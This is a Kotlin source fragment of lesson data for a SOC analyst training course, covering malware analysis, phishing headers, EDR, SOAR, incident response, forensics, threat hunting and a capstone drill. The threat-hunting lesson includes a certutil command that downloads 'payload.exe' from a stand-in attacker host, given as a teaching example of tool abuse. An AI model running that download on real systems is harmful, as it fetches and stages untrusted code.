                Malware analysis is the process of dissecting malicious files to understand how they work, how they can be detected, and what damage they do.
                
                Analysis Methods:
                • Static Analysis — Inspecting a file without running it (examining hashes, PE headers, imports, or searching for strings inside the binary code).
                • Dynamic Analysis — Running the file inside a hardened, isolated sandbox (like Cuckoo sandbox) to monitor active file changes, registry alterations, and network communication.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Strings extract", "strings -n 8 suspect_file.exe", "Extracts readable text from suspect file to identify URLs/ips", "strings filename", "Security"),
                CommandModel("File parser", "file suspect_file.exe", "Verifies true file types of suspect files", "file suspect", "Security"),
                CommandModel("PE dump", "pecheck suspect_file.exe", "Parses Portable Executable structures in terminal", "pecheck file", "Security")
            ),
            labSteps = listOf(
                "Create an isolated sandbox environment.",
                "Place dangerous suspect files inside the sandbox.",
                "Query file type using the file command.",
                "Calculate hash value using sha256sum.",
                "Search hash value on VirusTotal database.",
                "Extract readable ascii strings using strings command.",
                "Identify hardcoded external IP addresses or domain names in output.",
                "Inspect suspect imports using PE analyzer tools.",
                "Open malware inside an isolated virtual machine monitor.",
                "Monitor dynamic process tree anomalies."
            ),
            labHints = listOf(
                "Use a Type 2 hypervisor with host interfaces disconnected.",
                "Never run dangerous files on host computers directly.",
                "Confirms executable types.",
                "Produces unique hash footprints.",
                "Checks if standard AV platforms flag it.",
                "Reveals readable text clues.",
                "Highlights prospective Command-and-Control hosts.",
                "Check system libraries used by binary.",
                "Executes file in controlled, monitored state.",
                "Spot child shell components launching."
            ),
            quiz = listOf(
                QuizQuestionModel("What is the difference between static and dynamic malware analysis?", listOf("Static is hardware, dynamic is cloud", "Static inspects file metadata without running it; dynamic monitors file executions", "Static uses antivirus, dynamic uses firewalls", "Static is for Windows, dynamic is for Linux"), "Static inspects file metadata without running it; dynamic monitors file executions"),
                QuizQuestionModel("What command extracts readable text from binaries?", listOf("strings", "cat", "grep", "file"), "strings"),
                QuizQuestionModel("What environment is required for dynamic analysis?", listOf("An active enterprise network", "An isolated, sandboxed virtual machine", "An open web browser", "A public host server"), "An isolated, sandboxed virtual machine"),
                QuizQuestionModel("What standard executable format does Windows utilize?", listOf("ELF", "PE (Portable Executable)", "APK", "DMG"), "PE (Portable Executable)"),
                QuizQuestionModel("What does a network connection to port 4444 in shell scripts often suggest?", listOf("DNS lookup session", "Reverse shell / Command and Control", "Database query", "Web hosting updates"), "Reverse shell / Command and Control")
            ),
            resources = listOf(
                ResourceModel("Malware Analysis Intro", "https://tryhackme.com/room/malwareintro", "Basic concepts of static and dynamic analysis", "TryHackMe", "red")
            )
        ),
        // LESSON 23
        LessonModel(
            id = 23,
            title = "Phishing Analysis",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 35,
            theory = """
                Phishing is one of the most common ways attackers gain initial access to an organization.
                
                Phishing emails are crafted to look like legitimate corporate communications to trick users into revealing credentials or running malicious attachments.
                
                Analyzing raw email files (.eml) is a core duty:
                
                Authentication Headers:
                • SPF (Sender Policy Framework) — Validates if the sending mail server IP is authorized to send emails on behalf of the domain name.
                • DKIM (DomainKeys Identified Mail) — Cryptographically signs emails to verify they were sent by the domain and not modified in transit.
                • DMARC — Directs the receiver's server on what to do if SPF or DKIM checks fail (None, Quarantine, Reject).
            """.trimIndent(),
            commands = listOf(
                CommandModel("Domain TXT", "dig google.com TXT", "Retrieves public DNS TXT records containing SPF configurations", "dig domain TXT", "Network")
            ),
            labSteps = listOf(
                "Open a raw email file (.eml) in a text editor.",
                "Locate the Return-Path and From fields in headers.",
                "Check for spelling errors or slight variations (typosquatting) in the sender domain.",
                "Analyze SPF verification outcomes in headers.",
                "Analyze DKIM results for digital signatures.",
                "Analyze DMARC instruction policies.",
                "Extract links from email bodies without clicking them.",
                "Analyze links on URL reputation engines.",
                "Dismount and analyze any attachment files in sandbox.",
                "Draft company-wide remediation alerts."
            ),
            labHints = listOf(
                "Access headers directly.",
                "Check if Return-Path matches From.",
                "E.g. microsoft-support.com instead of microsoft.com.",
                "Look for 'spf=pass' or 'spf=fail'.",
                "Ensure sign validation registers as valid.",
                "Look for 'dmarc=pass' report.",
                "Copy text pathways safely.",
                "Check threat reputations.",
                "Verify attachments in isolated VMs.",
                "Alert users and isolate threats."
            ),
            quiz = listOf(
                QuizQuestionModel("What protocol verifies if mail server IPs are authorized to send mail for a domain?", listOf("SPF", "DKIM", "DMARC", "SMTP"), "SPF"),
                QuizQuestionModel("What validation mechanism adds digital signatures to email headers?", listOf("SPF", "DKIM", "DMARC", "SSL/TLS"), "DKIM"),
                QuizQuestionModel("What is typosquatting?", listOf("Attacking web database servers", "Registering domain variations that mimic legitimate ones to trick users", "Capturing network packets on switches", "Automating shell backup scripts"), "Registering domain variations that mimic legitimate ones to trick users"),
                QuizQuestionModel("What is the job of DMARC policies?", listOf("Encrypt email contents", "Dictate action blocks if SPF/DKIM validation checks fail", "Sign header fields", "Format system displays"), "Dictate action blocks if SPF/DKIM validation checks fail"),
                QuizQuestionModel("Which file format represents standard email message storage?", listOf(".eml", ".exe", ".pcap", ".log"), ".eml")
            ),
            resources = listOf(
                ResourceModel("Phishing Analysis Room", "https://tryhackme.com/room/phishingemailscarpe", "Investigating phishing email headers", "TryHackMe", "red")
            )
        ),
        // LESSON 24
        LessonModel(
            id = 24,
            title = "EDR Tools",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 30,
            theory = """
                Legacy Antivirus relies mostly on simple file signature blocks (known bad hashes). Attackers bypass this easily by changing minor compiler details.
                
                EDR (Endpoint Detection and Response) goes beyond static signatures. EDR agents run continuously on endpoints, monitoring system behaviors:
                • Maps process trees in real-time (detects word.exe spawning cmd.exe or powershell.exe).
                • Tracks registry modifications, network connections, and memory injection anomalies.
                
                Core tools: Wazuh, CrowdStrike, Carbon Black, Elastic Agent.
            """.trimIndent(),
            commands = listOf(
                CommandModel("EDR Agent status", "sudo systemctl status wazuh-agent", "Presents execution status of host-based EDR agent", "systemctl status agent", "Security"),
                CommandModel("Process anomaly", "ps auxf", "Renders process relationships in hierarchical visual tree layouts", "ps -ef --forest", "Linux")
            ),
            labSteps = listOf(
                "Access local Wazuh EDR dash boards.",
                "Observe active endpoint registries.",
                "Open terminal and spawn a suspicious action (e.g., calling net user).",
                "Navigate back to Wazuh Security Alerts console.",
                "Identify the alert triggered by net user execution.",
                "Review the triggered alert's metadata path.",
                "Analyze process tree linkages (e.g., cmd.exe launching whoami).",
                "Initiate remote endpoint isolation from control menu.",
                "Verify endpoint networking gets isolated.",
                "Restore endpoint normal connection parameters."
            ),
            labHints = listOf(
                "Access management server dashboards.",
                "Verifies active log transmissions.",
                "Simulates threat credential hunts.",
                "Check alert list feed.",
                "Examine technique ID and rules matched.",
                "Provides OS process pathways.",
                "Rogue child shell spawning indicates execution breaches.",
                "Prevents prospective lateral pivot spreading.",
                "Only permits connection alerts to the SIEM/EDR server.",
                "Restores endpoint operations."
            ),
            quiz = listOf(
                QuizQuestionModel("What does EDR stand for?", listOf("Email Detection and Routing", "Endpoint Detection and Response", "External Database Recovery", "Encrypted Domain Registry"), "Endpoint Detection and Response"),
                QuizQuestionModel("Why is EDR superior to static legacy antivirus?", listOf("Uses less network bandwidth", "Monitors active behavior and process behaviors dynamically", "Doesn't require installation", "Completely uninstalls other components"), "Monitors active behavior and process behaviors dynamically"),
                QuizQuestionModel("What does word.exe spawning cmd.exe usually indicate?", listOf("A normal software update", "A web browser crash", "A suspect execution breach (malicious macro)", "Active database indexing"), "A suspect execution breach (malicious macro)"),
                QuizQuestionModel("Which of the following is an open-source EDR platform?", listOf("Nmap", "Wireshark", "Wazuh", "Metasploit"), "Wazuh"),
                QuizQuestionModel("What EDR action isolates a breached computer from the wider network?", listOf("Eradication", "File shredding", "Network Isolation", "Key backup"), "Network Isolation")
            ),
            resources = listOf(
                ResourceModel("Wazuh EDR Basics", "https://tryhackme.com/room/wazah", "Deploying and managing alarms in Wazuh", "TryHackMe", "red")
            )
        ),
        // LESSON 25
        LessonModel(
            id = 25,
            title = "SOAR & Automation",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 30,
            theory = """
                SOAR (Security Orchestration, Automation, and Response) connects your SIEM, EDR, Firewall, and Active Directory into automated workflows called Playbooks.
                
                When a security alert triggers:
                Instead of an analyst manually running queries, lookup tasks, or copy-pasting, the SOAR automatically gathers details, checks virus total, and isolates endpoints.
            """.trimIndent(),
            commands = listOf(
                CommandModel("API isolation", "curl -X POST -H \"Authorization: Bearer \$KEY\" -d \"host=10.0.0.5\" https://edr.api/isolate", "Simulates automated API call isolating system via EDR", "curl -d 'host=...' https://api", "Security")
            ),
            labSteps = listOf(
                "Analyze standard flowchart playbooks.",
                "Create a mock SOAR script flow.",
                "Incorporate IP validation into automation actions.",
                "Add API calls to pull VirusTotal threat scores.",
                "Configure conditional branch results (if score > 5, escalate).",
                "Integrate actions that send alerts to teams (Slack/Teams integration).",
                "Add automated EDR isolation calls.",
                "Trigger the automated workflow from terminal.",
                "Log execution histories inside your SOAR platform.",
                "Optimize delays in your automated steps."
            ),
            labHints = listOf(
                "Visualizes sequence flow.",
                "Use a standard coding file.",
                "Filter internal corporate IPs.",
                "Integrates public API requests.",
                "Evaluates score status.",
                "Informs active security squads.",
                "Isolates targets without manual intervention.",
                "Launch test threats.",
                "Verifies actions compiled cleanly.",
                "Reduces response run times."
            ),
            quiz = listOf(
                QuizQuestionModel("What does SOAR stand for?", listOf("Systemic Operation and Asset Recovery", "Security Orchestration, Automation, and Response", "Software Overhaul and Assessment Representative", "Secure OAuth Authentication Router"), "Security Orchestration, Automation, and Response"),
                QuizQuestionModel("What is a SOAR 'Playbook'?", listOf("A guidebook for team salary layouts", "An automated step-by-step workflow reacting to alerts", "A database of Windows CVEs", "An interactive network scanner layout"), "An automated step-by-step workflow reacting to alerts"),
                QuizQuestionModel("What is the primary benefit of deploying SOAR tools?", listOf("Reduce server disk scale", "Minimize response times by automating manual tasks", "Encrypt local terminal environments", "Allow free web connectivity"), "Minimize response times by automating manual tasks"),
                QuizQuestionModel("Which software represents an enterprise SOAR tool?", listOf("Palo Alto Cortex SOAR / Splunk Phantom", "Wireshark", "Nmap", "Ubuntu Server"), "Palo Alto Cortex SOAR / Splunk Phantom"),
                QuizQuestionModel("What protocol connects security systems to SOAR engines?", listOf("FTP", "API integrations", "Telnet", "SMTP"), "API integrations")
            ),
            resources = listOf(
                ResourceModel("Automation and SOC", "https://tryhackme.com/room/soar", "Understanding automated playbooks", "TryHackMe", "red")
            )
        ),

        // PHASE 4: INCIDENT RESPONSE
        LessonModel(
            id = 26,
            title = "IR Lifecycle PICERL",
            phase = 4,
            phaseName = "Incident Response",
            durationMin = 35,
            theory = """
                When a breach occurs, we follow a rigorous lifecycle to contain damage. The SANS PICERL framework is standard:
                
                The 6 Phases of Incident Response:
                1. Preparation — Developing incident response plans, policies, training, and securing systems before an incident occurs.
                2. Identification — Detecting, verifying, and assessing the scope of security incidents (triage).
                3. Containment — Restricting the spread of threat actors (isolating endpoints, disabling accounts, blocking IPs).
                4. Eradication — Deleting malware, removing backdoor accounts, and patching vulnerabilities.
                5. Recovery — Restoring systems back to clean production states (restoring from backups, testing configurations).
                6. Lessons Learned — Post-incident review: what happened, why, and how to improve.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Lock compromised user", "sudo usermod -L compromised_user", "Locks account of a compromised user to contain threat", "usermod -L user", "Linux"),
                CommandModel("Disable Active Directory", "Disable-ADAccount -Identity \"compromised_user\"", "Disables domain security accounts inside Powershell AD console", "Disable-ADAccount ...", "PowerShell")
            ),
            labSteps = listOf(
                "Perform tabletop preparation assessments.",
                "Declare alert indicators (Identification phase).",
                "Execute lock action to contain user accounts (Containment phase).",
                "Drop communication links on suspicious IP cards.",
                "Isolate compromised VMs on virtual switch adapters.",
                "Purge malicious binaries from directories (Eradication phase).",
                "Rebuild system configurations using clean code bases (Recovery phase).",
                "Verify service states and system integrity.",
                "Draft complete post-incident analyses (Lessons Learned phase).",
                "Synthesize lessons learned results into system policy improvements."
            ),
            labHints = listOf(
                "Discuss hypotheticals.",
                "Isolate alert threat parameters.",
                "Stop credential misuse.",
                "Perform IP block rules.",
                "Enforces network containment boundaries.",
                "Ensures malicious elements are deleted.",
                "Clean restore backups.",
                "Confirm system is performing normally.",
                "Review time and vectors charts.",
                "Incorporate findings directly into playbooks."
            ),
            quiz = listOf(
                QuizQuestionModel("What represent the 6 phases of SANS IR Lifecycle?", listOf("Prepare, Audit, Capture, Block, Recover, Report", "Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned", "Plan, Inspect, Correlate, Eliminate, Restore, Log", "Public, Internal, Classified, Encrypted, Restricted, Limited"), "Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned"),
                QuizQuestionModel("During what phase are backdoors and malware deleted?", listOf("Identification", "Containment", "Eradication", "Recovery"), "Eradication"),
                QuizQuestionModel("What is shepherding endpoints into isolated subnets called?", listOf("Identification", "Containment", "Eradication", "Lessons Learned"), "Containment"),
                QuizQuestionModel("When do custom reviews and workflow improvements take place?", listOf("Preparation", "Recovery", "Lessons Learned", "Identification"), "Lessons Learned"),
                QuizQuestionModel("What does the usermod -L command do?", listOf("Deletes accounts", "Changes owner permissions", "Locks user password logins", "Adds user to sudo root"), "Locks user password logins")
            ),
            resources = listOf(
                ResourceModel("SANS IR Lifecycle", "https://tryhackme.com/room/securityincidentresponse", "Learn PICERL frameworks recursively", "TryHackMe", "red")
            )
        ),
        LessonModel(
            id = 27,
            title = "Digital Forensics Basics",
            phase = 4,
            phaseName = "Incident Response",
            durationMin = 40,
            theory = """
                Digital Forensics involves collecting, preserving, and analyzing digital evidence to reconstruct security incidents.
                
                The non-negotiable rule of forensics is maintaining the integrity of evidence (maintaining Chain of Custody).
                
                Volatility of Evidence (Order of Volatility):
                We must capture data from the most volatile sources (e.g., RAM) to the least volatile (e.g., hard drives). RAM contains active processes, Decrypted keys, and network connection logs that vanish when a server reboot occurs!
            """.trimIndent(),
            commands = listOf(
                CommandModel("RAM capture", "sudo dd if=/dev/fmem of=/tmp/ram_dump.raw bs=1M", "Dumps raw volatile physical RAM memory state to disk", "dd if=/dev/mem of=dump", "Linux"),
                CommandModel("Disk image", "sudo dd if=/dev/sdb of=/tmp/usb_image.dd conv=noerror,sync bs=64K", "Creates bit-by-bit physical disk copy of USB storage", "dd if=/dev/sdb ...", "Linux"),
                CommandModel("Volat analysis", "volatility -f ram_dump.raw --profile=Win7SP1x64 pslist", "Query running processes from captured live RAM memory images", "volatility -f ...", "Security")
            ),
            labSteps = listOf(
                "Confirm hardware write-blockers are active.",
                "Calculate cryptographic checksum of physical disk inputs.",
                "Create physical clone of storage via dd command tool.",
                "Verify replica checksum matches original checksum exactly.",
                "Analyze disk images locally using Autopsy.",
                "Load raw volatile RAM dumps into Volatility tools.",
                "List processes from the memory dump via the pslist Volatility command.",
                "Extract suspicious payloads from memory space.",
                "Check system registry hives for persistence.",
                "Log all findings with precise chain-of-custody notations."
            ),
            labHints = listOf(
                "Prevents accidental tampering with evidence.",
                "Saves base hash record.",
                "Performs bit-by-bit clone transfer.",
                "Preserves absolute evidence integrity standard.",
                "A modular UI forensics platform.",
                "Loads memory investigation logs.",
                "Prints past active processes.",
                "Saves files to disk.",
                "Examine Run keys configs.",
                "Ensures evidence is legally valid."
            ),
            quiz = listOf(
                QuizQuestionModel("What is the golden rule of Digital Forensics?", listOf("Format the device immediately", "Preserve the original evidence without tampering", "Exfiltrate database keys", "Always reboot systems fast"), "Preserve the original evidence without tampering"),
                QuizQuestionModel("Which of the following is the most volatile form of evidence?", listOf("Solid State Drive (SSD)", "Mechanical Hard Drive (HDD)", "System Memory (RAM)", "Paper logs"), "System Memory (RAM)"),
                QuizQuestionModel("What CLI tool creates absolute, sector-by-sector disk copies?", listOf("grep", "dd", "tar", "rsync"), "dd"),
                QuizQuestionModel("What open-source software analyzes RAM/Memory dumps selectively?", listOf("Autopsy", "Nessus", "Volatility", "Wireshark"), "Volatility"),
                QuizQuestionModel("What does a matching cryptographic hash between clone and source prove?", listOf("The disk was encrypted", "The replication was corrupted", "The evidence integrity was preserved perfectly", "The system was cleaned of malware"), "The evidence integrity was preserved perfectly")
            ),
            resources = listOf(
                ResourceModel("Autopsy forensics", "https://tryhackme.com/room/autopsy2df", "Unraveling incidents using Autopsy", "TryHackMe", "red"),
                ResourceModel("Volatility room", "https://tryhackme.com/room/bpvolatility", "Deep analysis of memory dumps", "TryHackMe", "red")
            )
        ),
        // LESSON 28
        LessonModel(
            id = 28,
            title = "Threat Hunting",
            phase = 4,
            phaseName = "Incident Response",
            durationMin = 40,
            theory = """
                Threat hunting is the proactive process of searching through networks and endpoints to detect malicious activities that have bypassed standard automated endpoint security checks.
                
                Living off the Land (LOLBAS):
                Adversaries frequently use benign, built-in system tools (like powershell.exe, certutil.exe) to execute file downloads and commands. They do this because AV platforms trust built-in system tools!
            """.trimIndent(),
            commands = listOf(
                CommandModel("Certutil DL", "certutil -urlcache -f -split \"https://threat.site/payload.exe\" payload.exe", "Simulates threat actors abusing certutil to download binaries", "certutil -urlcache ...", "PowerShell"),
                CommandModel("Rogue Task", "schtasks /query /fo LIST /v", "Queries custom task schedules identifying persistent threats", "schtasks /query", "PowerShell")
            ),
            labSteps = listOf(
                "Establish operational baselines on standard system processes.",
                "Search system configurations identifying atypical scheduled tasks.",
                "Examine process chains highlighting certutil execution downloads.",
                "Evaluate custom registry Run entries.",
                "Identify rogue administrative privileges.",
                "List hidden files inside /tmp or AppData paths.",
                "Query endpoint logs for remote connection handshakes.",
                "Extract anomalous files for hash checksum lookup.",
                "Document hunting steps inside playbooks.",
                "Submit indicators payload into detection rules indexes."
            ),
            labHints = listOf(
                "Helps differentiate normal from anomaly.",
                "schtasks or systemd-timers can hide threats recursively.",
                "Attackers abuse this to pull files.",
                "Registry Run triggers execute at booting.",
                "Analyze unusual users cataloged inside high admin boards.",
                "Common storage choices for attackers.",
                "Spot anomalous outbound connections.",
                "Perform checksum reviews.",
                "Drives repeatable security sweeps.",
                "Pushes updates to SIEM alert engines."
            ),
            quiz = listOf(
                QuizQuestionModel("What is proactive Threat Hunting?", listOf("Running normal scheduled virus scans", "Searching proactively through networks to find undetected threats", "Writing standard company security newsletters", "Resetting user passwords"), "Searching proactively through networks to find undetected threats"),
                QuizQuestionModel("What does LOLBAS stand for in cyber security?", listOf("Local Operator List Bypass and Security", "Living off the Land Binaries and Scripts", "Local Only Log Buffer Analysis Suite", "Lock Out Logins Basis and Systems"), "Living off the Land Binaries and Scripts"),
                QuizQuestionModel("Why do threat actors use built-in system tools?", listOf("They are faster to download", "To blend in and bypass standard signature-based security", "They prevent system reboots", "They only run inside Linux"), "To blend in and bypass standard signature-based security"),
                QuizQuestionModel("What built-in Windows tool carries risk of file download abuses?", listOf("calc.exe", "certutil.exe", "notepad.exe", "regedit.exe"), "certutil.exe"),
                QuizQuestionModel("What are registry 'Run' keys abused for?", listOf("Vulnerability assessment", "Persistence (malware runs at boot)", "Network file transfer", "DNS routing modifications"), "Persistence (malware runs at boot)")
            ),
            resources = listOf(
                ResourceModel("Threat Hunting Introduction", "https://tryhackme.com/room/threathuntingintro", "Proactive hunt methodologies", "TryHackMe", "red")
            )
        ),
        // LESSON 29
        LessonModel(
            id = 29,
            title = "APT Case Studies",
            phase = 4,
            phaseName = "Incident Response",
            durationMin = 30,
            theory = """
                Advanced Persistent Threats (APTs) are highly-sophisticated, well-resourced nation-state threat groups.
                
                Unlike standard script kiddies, APTs conduct target-specific cyber operations over months or years, attempting to maintain access.
                
                Famous Case Studies:
                • SolarWinds (APT29 / Nobelium) — Supply Chain compromise. Backdoor code was injected directly into SolarWinds software updates, corrupting thousands of verified corporate targets.
                • Stuxnet — Legendary worm targeting nuclear centrifuges by manipulating PLC hardware controllers, introducing PLC command alterations.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Threat Hunt", "grep -r \"SolarWinds\" /var/log/syslog", "Puisne sweep for case study keywords", "grep 'SolarWinds' log", "Security")
            ),
            labSteps = listOf(
                "Analyze SolarWinds attack sequence files.",
                "Study supply chain attack entry vectors.",
                "Trace how backdoors executed silently.",
                "Examine Stuxnet software propagation cycles.",
                "Observe how Stuxnet targeted isolated systems (air-gapped networks) via USB.",
                "Analyze APT38 financial sector breaches.",
                "Review MITRE ATT&CK profiles cataloging APT groups.",
                "Map threat actor tools to custom firewall defensive postures.",
                "Translate threat vectors into SIEM lookup rules.",
                "Conduct tabletop team assessments covering supply-chain breaches."
            ),
            labHints = listOf(
                "Read detailed target advisory briefings.",
                "Software update channels must be tightly audited.",
                "Wait days before executing to bypass standard analysis tools.",
                "Observe targeting controls.",
                "Uses local vulnerabilities recursively to pivot.",
                "Targeting banking platforms specifically.",
                "Check custom tactics lists.",
                "Construct rule mitigations.",
                "Ready to scan for custom actor IOCs.",
                "Assess enterprise readiness limits."
            ),
            quiz = listOf(
                QuizQuestionModel("What is an Advanced Persistent Threat (APT)?", listOf("A temporary script kiddie campaign", "A highly sophisticated, well-funded (typically nation-state) threat group", "An automated network port scan", "A hardware firewall standard specification"), "A highly sophisticated, well-funded (typically nation-state) threat group"),
                QuizQuestionModel("What entry vector did the SolarWinds attack exploit?", listOf("Weak user passwords", "Supply Chain compromise (software update injection)", "Physical data center break-in", "Insecure wireless networks"), "Supply Chain compromise (software update injection)"),
                QuizQuestionModel("What was Stuxnet specifically designed to target?", listOf("Public web browsers", "Industrial Control Systems (PLC nuclear centrifuges)", "Credit card databases", "Corporate email systems"), "Industrial Control Systems (PLC nuclear centrifuges)"),
                QuizQuestionModel("How did Stuxnet propagate across air-gapped networks?", listOf("Public internet downloads", "Abusing USB storage drives and local exploits", "Inbound email phishing", "DNS redirect triggers"), "Abusing USB storage drives and local exploits"),
                QuizQuestionModel("What does APT29's alias (Nobelium) represent?", listOf("A decryption key standard", "A specific nation-state threat group", "An enterprise threat scanner", "A correlation rule parameter"), "A specific nation-state threat group")
            ),
            resources = listOf(
                ResourceModel("SolarWinds Study Suite", "https://tryhackme.com/room/solarwindsbreach", "Technical post-mortem breakdown", "TryHackMe", "red")
            )
        ),
        // LESSON 30
        LessonModel(
            id = 30,
            title = "Capstone SOC Simulation",
            phase = 4,
            phaseName = "Incident Response",
            durationMin = 60,
            theory = """
                Welcome to your final Academy Challenge! This Capstone Simulation ties together everything you have learned across the:
                - Sysadmin Foundations (Linux / Windows)
                - Security Fundamentals (Frameworks / Firewalls)
                - SOC Core Skills (SIEM / Traffic Analysis / Triage)
                - Incident Response Lifecycle (PICERL / Forensics)
                
                The Scenario:
                An alert fires inside the SIEM dashboard: 'Priority 1 - Rogue Command Shell Spawned'. An analyst notes that a compromised public web server is executing command calls toward external IPs.
                
                Your Mission:
                Review the alert details, trace the process hierarchies, block the malicious traffic, isolate the compromised host, and write post-mortem reports.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Simulate Alert", "sudo logger -t SOC_ALERT \"POSSIBLE WEB SHELL DETECTED ON PORT 80 - EXEC PATH /var/www/html/uploads/\"", "Fires simulated capstone alert directly into syslog", "logger -t SOC_ALERT ...", "Security"),
                CommandModel("Eradication block", "sudo ufw deny out to 198.51.100.42", "Blocks outbound communication to active C2 servers in UFW", "ufw deny out ...", "Security")
            ),
            labSteps = listOf(
                "Trigger the Capstone Simulation alert using the logger command.",
                "Locate the alert in syslog: grep SOC_ALERT /var/log/syslog.",
                "Trace host configurations: check whoami privileges and active logins.",
                "Identify rogue outbound network connections: ss -tulnp.",
                "Trace process trees: ps auxf.",
                "Isolate compromised system: block outbound traffic to C2 (198.51.100.42) using UFW.",
                "Lock the compromised user account: sudo usermod -L testuser.",
                "Eradicate the threat: purge malicious php web files from uploads dir.",
                "Verify system is clean: run checksum audits and verify CPU usage clears normal.",
                "Compile final Capstone investigation summary report."
            ),
            labHints = listOf(
                "Initiates custom alert pipeline.",
                "Finds threat indicators.",
                "Inspect user environments.",
                "Spot connections hitting port 4444.",
                "Spot Apache spawning bash sessions.",
                "Cuts C2 communication channels immediately.",
                "Neutralizes account access privileges.",
                "Deletes PHP backdoor scripts.",
                "Confirms operations are safe.",
                "Saves results to complete training."
            ),
            quiz = listOf(
                QuizQuestionModel("What is the first operational step on detecting a compromised host?", listOf("Shred the hard drive", "Contain the system to stop further damage/spread", "Email the threat actor", "Buy new hardware units"), "Contain the system to stop further damage/spread"),
                QuizQuestionModel("An Apache process spawns a Bash shell. What is the most likely threat?", listOf("A standard database update", "An active Web Shell exploit", "A hardware firewall upgrade", "A regular system backup"), "An active Web Shell exploit"),
                QuizQuestionModel("What command locks out compromised system accounts in Linux?", listOf("usermod -L", "userdel -f", "passwd -d", "chown root"), "usermod -L"),
                QuizQuestionModel("Why is blocking outbound outbound connections to C2 IPs crucial?", listOf("It speeds up formatting", "It cuts off the attacker's control and data exfiltration channel", "It updates DNS databases", "It secures emails"), "It cuts off the attacker's control and data exfiltration channel"),
                QuizQuestionModel("What does the post-incident 'Lessons Learned' review document prioritize?", listOf("Company salary adjustments", "Identifying root cause and improving defenses to prevent recurrence", "Buying cheaper hardware", "Changing company logo designs"), "Identifying root cause and improving defenses to prevent recurrence")
            ),
            resources = listOf(
                ResourceModel("SOC Simulation Suite", "https://tryhackme.com/room/soclevel1funtastics", "Defending real enterprise infrastructures", "TryHackMe", "red")
            )
        )
    )
}
